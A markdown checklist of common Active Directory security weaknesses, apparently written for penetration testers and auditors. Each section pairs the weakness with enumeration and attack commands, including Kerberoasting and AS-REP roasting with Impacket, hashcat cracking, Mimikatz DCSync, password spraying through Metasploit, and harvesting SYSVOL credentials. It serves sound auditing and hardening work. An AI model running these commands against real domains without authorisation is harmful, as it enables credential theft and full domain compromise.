# Active directory vulnerabilities

The most commonly found vulnerabilities, unordered, just as checklist.

## Users having rights to add computers to domain

In a default installation of Active Directory, any domain user can add workstations to the domain, as defined by the 
`ms-DS-MachineAccountQuota` attribute (default = 10). This means that any low privileged domain user can join up to 
10 computers to the domain. 

This setting allows any user to join an unmanaged computer (like BYOD) to access the corporate domain:

* No Antivirus or EDR solution is pushed onto their machine
* No GPO settings or policies apply to their system
* Allows them having Administrative rights on their system

PowerShell command:

    add-computer –domainname <FQDN-DOMAIN> -Credential <DOMAIN>\<USER> -restart –force

List all computers that were added by non-admins:

    Import-Module ActiveDirectory
    Get-ADComputer -LDAPFilter "(ms-DS-CreatorSID=*)" -Properties ms-DS-CreatorSID

## AdminCount attribute set on common users

The `AdminCount` attribute in Active Directory is used to protect administrative users and members of privileged 
group such as Domain Admins, Enterprise Admins, Schema Admins, Backup Operators, Server Operators, Replicator, etc.

When the `AdminCount` attribute is set to 1 automatically when a user is assigned to any privileged group, but is 
never automatically unset when the user is removed from these group(s), common low privileged users with AdminCount 
set to 1 without being members of any privileged group exist.

Collect information from the domain controller:

    python ldapdomaindump.py -u <DOMAIN>\\<USER> -p <PASS> -d <DELIMITER> <DC-IP>

Instead of a password, the NTLM hash can also be used (pass-the-hash).

Get the list of users with `AdminCount` attribute set to 1 by parsing the `domain_users.json` file:

    jq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json

With access to domain controllers, get a list of users:

    Import-Module ActiveDirectory
    Get-AdObject -ldapfilter "(admincount=1)" -properties admincount

## High number of users in privileged groups

An excessive number of users in privileges groups such as Domain Admins, Schema Admins and Enterprise Admins. 
If some of those get compromised, the entire domain is compromised.

From a low privileged domain account on a joined Windows machine, enumerate these groups from a domain:

    net group "Schema Admins" /domain
    net group "Domain Admins" /domain
    net group "Enterprise Admins" /domain

From a non-joined Windows machine, authenticate to the domain first:

    runas /netonly /user:<DOMAIN>\<USER> cmd.exe

From Linux (Kali Linux) using the `net` command:

    net rpc group members 'Schema Admins' -I <DC-IP> -U "<USER>"%"<PASS>"
    net rpc group members 'Domain Admins' -I <DC-IP> -U "<USER>"%"<PASS>"
    net rpc group members 'Enterprise Admins' -I <DC-IP> -U "<USER>"%"<PASS>"

## Service accounts are members of Domain Admins

A service account is to designate a specific user account with specific set of privileges to run a specific service 
(or application), without requiring to provide it with full administrative privileges.

Service accounts typically have passwords set to never expire, their passwords are rarely changed, and when get 
compromised, allows attackers full control over the AD domain, for a long time.

See "High number of users in privileged groups" above for ways to test.

## Excessive privileges shadow Domain Admins

Misuse of Active Directory Rights and Extended Rights - Access Control Entries (ACEs), such as: 

* ForceChangePassword – Ability to reset password of another user
* GenericAll – Full control over an object (read/write)
* GenericWrite – Update of any attributes of an object
* WriteOwner – Assume ownership of an object
* WriteDacl – Modify the DACL of an object
* Self – Arbitrarily modify self

Users with such excessive privileges are thus called shadow Domain Admins (or Hidden Admins). To look for these rights 
and trust misconfigurations, `bloodhound` is an excellent tool.

### Bloodhound

1. First use an `ingestor` to collect the data from the AD environment.
2. Upload the data into the Bloodhound front-end GUI to visualise relations between objects.
3. Start with the [pre-built queries](https://raw.githubusercontent.com/BloodHoundAD/BloodHound/e17462cf50422bfe9572e60390d32479fdbc32c4/src/components/SearchContainer/Tabs/PrebuiltQueries.json).
4. Add some [custom-built queries](https://raw.githubusercontent.com/porterhau5/BloodHound-Owned/master/customqueries.json).

## Service accounts vulnerable to Kerberoasting

Kerberoasting is a very common attack vector aimed against service accounts with weak passwords and when there is 
weak Kerberos RC4 encryption used for encrypting passwords.

This attack has been automated by Impacket and Rubeus all that is required is low privileged domain user credentials.

### Impacket

    GetUserSPNs.py -request <DOMAIN>/<USER>:<PASS>

Instead of a password, an NTLM hash can be used (pass-the-hash). If some hashes are given, there are service accounts 
vulnerable to Kerberoasting. The hashes can be exported to, for example, a `hashcat.txt` file and fed to hashcat for 
a dictionary attack:

    hashcat -m 13100 -a 0 hashes.txt wordlist.txt

## Users with non-expiring passwords

Some organisations have domain accounts configured with the `DONT_EXPIRE_PASSWORD` flag set. A typical setting for 
service accounts, and making vulnerable when set on more privileged domain accounts. High privileged domain accounts 
with non-expiring passwords are ideal targets for privilege escalation attacks and are common "backdoor" users for 
maintaining access by APT groups.

Collect information from the domain controller:

    python ldapdomaindump.py -u <DOMAIN>\\<USER> -p <PASS> -d <DELIMITER> <DC-IP>

Get the list of users with non-expiring passwords:

    grep DONT_EXPIRE_PASSWD domain_users.grep | grep -v ACCOUNT_DISABLED | awk -F ';' '{print $3}'

Or use PowerShell on a domain controller to get the list of such users:

    Import-Module ActiveDirectory
    Get-ADUser -filter * -properties Name, PasswordNeverExpires | where { $_.passwordNeverExpires -eq "true" } | where {$_.enabled -eq "true" }

## Users with password not required

If a user account has the `ASSWD_NOTREQD` flag set, the account doesn’t have to have a password. It means that any 
kind of password will be just fine – a short one, a non-compliant one (against domain password policy), or an empty one.

Use low privileged domain user credentials and the ability to reach LDAP port of any domain controller.

Collect information from the domain controller:

    python ldapdomaindump.py -u <DOMAIN>\\<USER> -p <PASS> -d <DELIMITER> <DC-IP>

Get the list of users with the `PASSWD_NOTREQD` flag:

    grep PASSWD_NOTREQD domain_users.grep | grep -v ACCOUNT_DISABLED | awk -F ';' '{print $3}'

Or use PowerShell on a domain controller to get the list of such users:

    Import-Module ActiveDirectory
    Get-ADUser -Filter {UserAccountControl -band 0x0020}

## Storing passwords using reversible encryption

Some applications require a user's password in plain text for authentication and this is why there 
is support for storing passwords using reversible encryption in Active Directory.

And why (perhaps) mitigations are in place which require an attacker to have to pull password data from the domain 
controllers in order to read the password in plain text. This means to have either:

* Rights to perform DCSYNC operation (Mimikatz)
* Access to the NTDS.DIT file on a domain controller

Both methods imply a full AD domain compromise already.

### Mimikatz

Using Mimikatz in the context of a high privileged user (who is able to perform DCSYNC), and knowing the username of 
an affected user:

    mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:<AFFECTED-USER>

## Storing passwords using LM hashes

Another vulnerability that typically surfaces after the Active Directory compromise is the storage of passwords as 
LM hash, instead of NTLM.

After dumping `ntds.dit` and 
[extracting Hashes and Domain Info From ntds.dit](https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/), 
identify LM hashes:

    grep -iv ':aad3b435b51404eeaad3b435b51404ee:' dumped_hashes.txt

## Service accounts vulnerable to AS-REP roasting

[Roasting AS-REPs](https://blog.harmj0y.net/activedirectory/roasting-as-reps/) is similar to Kerberoasting, but in 
this case the attack abuses user accounts with `DONT_REQ_PREAUTH` flag set.

To test for AS-REP roasting, knowing domain user credentials is not needed. We donneed to know is which users are affected.

If we do not know any, we can try a wordlist with usernames with Impacket:

    GetNPUsers.py <DOMAIN>/ -usersfile <USERLIST.TXT> -format [hashcat|john] -no-pass

If we do have low privileged domain user credentials, we can get the list of affected users with their Kerberos 
AS-REP hashes:

    GetNPUsers.py <DOMAIN>/<USER>:<PASS> -request -format [hashcat|john]

If we get some hashes, we can try to crack the AS-REP hashes with hashcat using a dictionary attack:

    hashcat -m 18200 -a 0 hashes.txt wordlist.txt

Or use PowerShell on a domain controller to get the list of users which do not require Kerberos pre-authentication:

    Import-Module ActiveDirectory
    Get-ADuser -filter * -properties DoesNotRequirePreAuth | where {$._DoesNotRequirePreAuth -eq "True" -and $_.Enabled -eq "True"} | select Name

## Weak domain password policy

Some organisations enforce long and complex passwords, changing them frequently, others do not enforce strong password 
parameters and instead focus on strengthening compensatory controls in the internal environments, so that an account 
compromise has very little impact. Each approach has its advantages and disadvantages.

### net

Display AD password policy from a domain joined Windows machine with low priviliges:

    net accounts /domain

### polenum

Display AD password policy from Linux (Kali Linux) using `polenum`:

    polenum --username <USER> --password <PASS> --domain <DC-IP>

### enum4linux

Display AD password policy from Linux (Kali Linux) using `enum4linux`:

    enum4linux -P -u <USER> -p <PASS> -w <DOMAIN> <DC-IP>

## Inactive domain accounts

Vulnerabilities caused by active user accounts without being used for a long time (according to their 
`Last logon date`) typically belong to employees that left the company, temporary accounts, and test accounts. This 
increases the attack surface for login attacks.

Collect information from the domain controller:

    python ldapdomaindump.py -u <DOMAIN>\\<USER> -p <PASS> -d <DELIMITER> <DC-IP>

Sort the users based on their last logon date:

    sort -t ';' -k 8 domain_users.grep | grep -v ACCOUNT_DISABLED | awk -F ';' '{print $3, $8}'

## Privileged users with password reset overdue

Having high privileged and administrative users configured with one password for a very long time, are likely targets 
for attackers (APTs).

Collect information from the domain controller:

    python ldapdomaindump.py -u <DOMAIN>\\<USER> -p <PASS> -d <DELIMITER> <DC-IP>

Get the list of users with `AdminCount` attribute set to 1 by parsing the `domain_users.json` file:

    jq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json > privileged_users.txt

Iterate through the list of privileged users, display last password reset date (pwdLastSet) and sort:

    while read user; do grep ";${user};" domain_users.grep; done < privileged_users.txt | \
    grep -v ACCOUNT_DISABLED | sort -t ';' -k 10 | awk -F ';' '{print $3, $10}'

## Users with a weak password

Even with a strong corporate password policy and security-aware mature environment, there can still be domain accounts 
with weak passwords.

Get a list of users from the AD using PowerShell on a domain joined Windows machine:

    $a = [adsisearcher]”(&(objectCategory=person)(objectClass=user))”
    $a.PropertiesToLoad.add(“samaccountname”) | out-null
    $a.PageSize = 1
    $a.FindAll() | % { echo $_.properties.samaccountname } > users.txt

Feed into DomainPasswordSpray.ps1 (PowerShell module), Invoke-BruteForce.ps1 (PowerShell module), 
Metasploit smb_login scanner, Nmap ldap-brute NSE script, CrackMapExec, Medusa, Ncrack, Hydra.

###  AD login bruteforcer

Password spraying with [minimalistic AD login bruteforcer](https://www.infosecmatter.com/minimalistic-ad-login-bruteforcer/):

    Import-Module ./adlogin.ps1
    adlogin users.txt domain.com password123

### Metasploit

Get a list of AD domain users using the `net` command:

    net rpc group members 'Domain Users' -I <DC-IP> -U "<USER>"%"<PASS>"

Do the login attack:

    use auxiliary/scanner/smb/smb_login
    set RHOSTS <DC-IP>
    set SMBDomain <DOMAIN>
    set SMBPass file:pwdlist.txt
    set USER_FILE users.txt
    set THREADS 5
    run

## Credentials in SYSVOL

Credentials are stored in `SYSVOL` network share folders, which are folders on domain controllers accessible and 
readable to all authenticated domain users. examples are:

* Group Policy Preferences (GPP) with cPassword attribute (MS14-025)
* Hard-coded credentials in various scripts and configuration files

From a domain joined Windows machine:

    findstr /s /n /i /p password \\\\<DOMAIN>\sysvol\<DOMAIN>\*

From Linux (e.g. Kali Linux):

    mount.cifs -o domain=<DOMAIN>,username=<USER>,password=<PASS> //<DC-IP>/SYSVOL /tmp/mnt
    grep -ir 'password' /tmp/mnt

A cPassword attribute in the GPP XML files, for example, can be decrypted with `gpp-decrypt`.
And chances are the password will be reused somewhere.

## Resources

* [InfosecMatter](https://www.infosecmatter.com/)